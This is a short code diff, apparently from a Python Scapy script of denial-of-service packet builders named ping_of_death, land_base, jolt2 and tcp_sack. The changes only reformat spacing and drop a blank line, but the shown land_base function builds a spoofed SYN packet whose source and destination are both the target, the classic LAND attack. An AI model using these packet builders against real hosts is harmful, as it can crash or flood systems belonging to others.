@@ -20,16 +20,16 @@ def ping_of_death():
 
 def land_base(smac, target):
     data_link_layer = Ether(
-        src=smac
+        src = smac
     )
     network_layer = IP(
-        src=target,
-        dst=target
+        src = target,
+        dst = target
     )
     transport_layer = TCP(
-        sport=random.randint(1000, 65535),
-        dport=random.randint(1000, 65535),
-        flags="S"
+        sport = random.randint(1000, 65535),
+        dport = random.randint(1000, 65535),
+        flags = "S"
     )
     pkt = network_layer / transport_layer
     return pkt
@@ -81,7 +81,6 @@ def jolt2(flags, frag = 0, proto = 17, dst = "192.168.15.70", data = ""):
     data = data
     pkt = network_layer / data
     return pkt
-
 
 
 def tcp_sack():
